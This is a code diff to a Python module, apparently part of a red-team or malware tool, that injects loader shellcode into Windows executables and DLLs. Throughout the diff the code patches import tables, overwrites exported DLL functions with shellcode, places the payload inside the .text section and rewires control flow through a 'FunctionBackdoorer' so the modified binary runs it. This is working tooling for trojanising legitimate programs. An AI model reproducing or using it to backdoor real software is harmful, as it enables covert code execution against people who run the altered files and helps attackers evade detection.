@@ -12,52 +12,54 @@ from pe.superpe import SuperPe
 from model.project import Project
 from model.settings import Settings
 from pe.asmdisasm import *
+from model.defs import *
 
 logger = logging.getLogger("Injector")
 
 
-def inject_exe(
-    main_shc: bytes,
-    settings: Settings,  # Temp
-    carrier: Carrier,
-):
+def inject_exe(main_shc: bytes, settings: Settings, carrier: Carrier):
     exe_in = settings.inject_exe_in
     exe_out = settings.inject_exe_out
     carrier_invoke_style: CarrierInvokeStyle = settings.carrier_invoke_style
     source_style: FunctionInvokeStyle = settings.source_style
 
-    logger.info("--[ Injecting: into {} -> {}".format(
-        exe_in, exe_out
-    ))
+    logger.info("--[ Injecting: into {} -> {}".format(exe_in, exe_out))
 
-    # Read prepared loader shellcode
-    # And check if it fits into the target code section
+    # CHECK if shellcode fits into the target code section
     shellcode_len = len(main_shc)
     code_sect_size = carrier.superpe.get_code_section().Misc_VirtualSize
-    if shellcode_len + 128 > code_sect_size:
-        raise Exception("Error: Shellcode {}+128 too small for target code section {}".format(
-            shellcode_len, code_sect_size
+    if shellcode_len + CODE_INJECT_SIZE_CHECK_ADD > code_sect_size:
+        raise Exception("Error: Shellcode size {}+{} too small for target code section {}".format(
+            shellcode_len, CODE_INJECT_SIZE_CHECK_ADD, code_sect_size
         ))
 
     # superpe is a representation of the exe file. We gonna modify it, and save it at the end.
     superpe = SuperPe(exe_in)
     function_backdoorer = FunctionBackdoorer(superpe)
 
-    # Patch IAT if necessary
+    # Patch IAT (if necessary and wanted)
     if source_style == FunctionInvokeStyle.iat_reuse:
         for iatRequest in carrier.get_all_iat_requests():
             # skip available
             addr = superpe.get_vaddr_of_iatentry(iatRequest.name)
             if addr != None:
-                logger.info("   IAT {} is at: 0x{:X}".format(iatRequest.name, addr))
+                logger.info("    IAT {} is at: 0x{:X}".format(iatRequest.name, addr))
                 continue
             iat_name = superpe.get_replacement_iat_for("KERNEL32.dll", iatRequest.name)
+
+            if not settings.fix_missing_iat:
+                raise Exception("Error: {} not available, but fix_missing_iat is False".format(
+                    iatRequest.name
+                ))
+            # do the patch
             superpe.patch_iat_entry("KERNEL32.dll", iat_name, iatRequest.name)
+        # we modify the IAT raw, so reparsing is required
         superpe.pe.parse_data_directories()
 
     shellcode_offset: int = 0  # file offset
+
+    # Special case: DLL exported function direct overwrite
     if superpe.is_dll() and settings.dllfunc != "" and carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
-        # Special case: DLL exported function direct overwrite
         logger.info("---[ Inject DLL: Overwrite exported function {} with shellcode".format(settings.dllfunc))
         rva = superpe.getExportEntryPoint(settings.dllfunc)
 
@@ -73,14 +75,15 @@ def inject_exe(
         logger.info(f'----[ Using DLL Export "{settings.dllfunc}" at RVA 0x{rva:X} offset 0x{shellcode_offset:X} to overwrite')
         superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
 
-    else:  # Put it somewhere in the code section, and rewire the flow
+    else:  # EXE/DLL
+        # Put it somewhere in the code section, and rewire the flow
         sect = superpe.get_code_section()
         if sect == None:
             raise Exception('Could not find code section in input PE file!')
         sect_size = sect.Misc_VirtualSize  # Better than: SizeOfRawData
-        if sect_size < shellcode_len:
-            raise Exception("Shellcode too large: {} > {}".format(
-                shellcode_len, sect_size
+        if sect_size < shellcode_len + CODE_INJECT_SIZE_CHECK_ADD:
+            raise Exception("Shellcode too large: {}+{} > {}".format(
+                shellcode_len, CODE_INJECT_SIZE_CHECK_ADD, sect_size
             ))
         shellcode_offset = int((sect_size - shellcode_len) / 2)  # centered in the .text section
         shellcode_offset += sect.PointerToRawData
@@ -93,7 +96,7 @@ def inject_exe(
         superpe.pe.set_bytes_at_offset(shellcode_offset, main_shc)
 
         # rewire flow
-        if superpe.is_dll() and settings.dllfunc != "":
+        if superpe.is_dll() and settings.dllfunc != "":  # DLL
             if carrier_invoke_style == CarrierInvokeStyle.ChangeEntryPoint:
                 # Handled above
                 raise Exception("We should not land here")
@@ -129,16 +132,10 @@ def inject_exe(
     logger.info("--( Write to file: {}".format(exe_out))
     superpe.write_pe_to_file(exe_out)
 
-    # verify and log
-    #shellcode = file_readall_binary(shellcode_in)
-    #shellcode_len = len(shellcode)
-    #code = extract_code_from_exe_file(exe_out)
+    # Log
     code = file_readall_binary(exe_out)
     in_code = code[shellcode_offset:shellcode_offset+shellcode_len]
-    #jmp_code = code[function_backdoorer.backdoorOffsetRel:function_backdoorer.backdoorOffsetRel+12]
-    #if config.debug:
     observer.add_code_file("exe_extracted_carrier", in_code)
-    #    observer.add_code_file("exe_extracted_jmp", jmp_code)
 
 
 def injected_fix_iat(superpe: SuperPe, carrier: Carrier):
